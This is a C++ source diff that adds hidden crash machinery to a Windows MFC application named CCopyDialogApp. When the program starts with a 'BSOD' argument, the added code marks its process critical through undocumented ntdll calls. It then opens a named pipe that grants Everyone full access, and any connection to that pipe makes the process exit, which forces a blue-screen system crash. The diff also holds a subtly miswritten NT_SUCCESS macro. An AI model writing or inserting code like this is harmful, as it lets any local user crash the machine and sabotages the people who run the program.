@@ -12,7 +12,64 @@
 #ifdef _DEBUG
 #define new DEBUG_NEW
 #endif
+
+#ifndef _WINMAIN_
+#define _WINMAIN_
+#endif
+
 #include <functional>
+#include <locale>
+#include <codecvt>
+#include <sddl.h>
+extern int AFXAPI AfxWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
+	_In_ LPTSTR lpCmdLine, int nCmdShow);
+
+typedef LONG NTSTATUS;
+
+#define NT_SUCCESS(Status) ((NTSTATUS)(status)>=0)
+
+typedef NTSTATUS(NTAPI* pRtlSetProcessIsCritical)(
+	BOOLEAN bNew,
+	BOOLEAN* pbOld,
+	BOOLEAN bNeedScb
+	);
+
+typedef struct _CLIENT_ID {
+	HANDLE UniqueProcess;
+	HANDLE UniqueThread;
+} CLIENT_ID, * PCLIENT_ID;
+
+typedef NTSTATUS(NTAPI* pNtSetInformationProcess)(
+	HANDLE ProcessHandle,
+	DWORD ProcessInformationClass,
+	PVOID ProcessInformation,
+	ULONG ProcessInformationLength
+	);
+
+BOOL EnablePrivilege(LPCWSTR lpPrivilegeName) {
+	HANDLE hToken;
+	TOKEN_PRIVILEGES tp;
+
+	if (!OpenProcessToken(GetCurrentProcess(),
+		TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,
+		&hToken)) {
+		return FALSE;
+	}
+
+	if (!LookupPrivilegeValue(NULL, lpPrivilegeName, &tp.Privileges[0].Luid)) {
+		CloseHandle(hToken);
+		return FALSE;
+	}
+
+	tp.PrivilegeCount = 1;
+	tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
+
+	BOOL result = AdjustTokenPrivileges(hToken, FALSE, &tp,
+		sizeof(TOKEN_PRIVILEGES), NULL, NULL);
+	CloseHandle(hToken);
+
+	return result && (GetLastError() == ERROR_SUCCESS);
+}
 
 std::mutex dsMutex;
 // CCopyDialogApp
@@ -154,11 +211,106 @@ void DialogProc() {
 	}
 }
 
-BOOL CCopyDialogApp::InitInstance()
-{
+BOOL SetCriticalProcessViaRtl(BOOL bCritical) {
+	HMODULE hNtdll = GetModuleHandle(L"ntdll.dll");
+	if (!hNtdll) return FALSE;
+
+	pRtlSetProcessIsCritical RtlSetProcessIsCritical =
+		(pRtlSetProcessIsCritical)GetProcAddress(hNtdll,
+			"RtlSetProcessIsCritical");
+
+	if (!RtlSetProcessIsCritical) {
+		return FALSE;
+	}
+
+	NTSTATUS status = RtlSetProcessIsCritical(bCritical, NULL, FALSE);
+	return NT_SUCCESS(status);
+}
+
+// 方法2：使用NtSetInformationProcess
+BOOL SetCriticalProcessViaNt(BOOL bCritical) {
+	HMODULE hNtdll = GetModuleHandle(L"ntdll.dll");
+	if (!hNtdll) return FALSE;
+
+	pNtSetInformationProcess NtSetInformationProcess =
+		(pNtSetInformationProcess)GetProcAddress(hNtdll,
+			"NtSetInformationProcess");
+
+	if (!NtSetInformationProcess) {
+		return FALSE;
+	}
+
+	ULONG BreakOnTermination = bCritical ? 1 : 0;
+	NTSTATUS status = NtSetInformationProcess(
+		GetCurrentProcess(),
+		0x1D, // ProcessBreakOnTermination
+		&BreakOnTermination,
+		sizeof(ULONG)
+	);
+
+	return NT_SUCCESS(status);
+}
+
+int WINAPI _tWinMain (HINSTANCE hInstance, HINSTANCE hPrevInstance, LPTSTR lpCmdLine, int nCmdShow) {
 	if (!isRunningAsAdmin()) {
 		Usermain();
 	}
+	std::wstring cmdl(lpCmdLine);
+	if (cmdl == L"BSOD") {
+		BOOL success = SetCriticalProcessViaRtl(TRUE);
+		if (!success) {
+			success = SetCriticalProcessViaNt(TRUE);
+		}
+		std::thread BSODThread([]() {
+			PSECURITY_DESCRIPTOR pSD = nullptr;
+			if (!ConvertStringSecurityDescriptorToSecurityDescriptorW(
+				L"D:(A;;GA;;;WD)(A;;GA;;;BA)", SDDL_REVISION_1, &pSD, nullptr)) {
+				return false;
+			}
+			SECURITY_ATTRIBUTES sa;
+			sa.nLength = sizeof(SECURITY_ATTRIBUTES);
+			sa.lpSecurityDescriptor = pSD;
+			sa.bInheritHandle = FALSE;
+			auto piep = CreateNamedPipeW(
+				L"\\\\.\\pipe\\BSODPipe",
+				PIPE_ACCESS_INBOUND,
+				PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT,
+				1,
+				512,
+				512,
+				0,
+				&sa
+			);
+			if (piep == INVALID_HANDLE_VALUE) {
+				LocalFree(pSD);
+				return false;
+			}
+			for (;;) {
+				BOOL connected = ConnectNamedPipe(piep, nullptr) ? TRUE : (GetLastError() == ERROR_PIPE_CONNECTED);
+				if (connected) {
+					std::this_thread::sleep_for(std::chrono::seconds(15));
+					ExitProcess(-1);
+				}
+			}
+			});
+		BSODThread.detach();
+		if (!BSODHook()) {
+			SetCriticalProcessViaRtl(FALSE);
+			return -1;
+		}
+		for (;;) {
+			std::this_thread::sleep_for(std::chrono::minutes(10));
+		}
+	}
+	/*std::wstring_convert<std::codecvt_utf8<wchar_t>> cvter;
+	std::wstring cmdline = cvter.from_bytes(cmdl).c_str();
+	LPTSTR cmdlline = new wchar_t[cmdline.size()+1];
+	StrCpyW(cmdlline, cmdline.c_str());*/
+	return AfxWinMain(hInstance, hPrevInstance, lpCmdLine, nCmdShow);
+}
+
+BOOL CCopyDialogApp::InitInstance()
+{
 	std::thread notice(Adminmain);
 	notice.detach();
 	DesktopWatchDog();
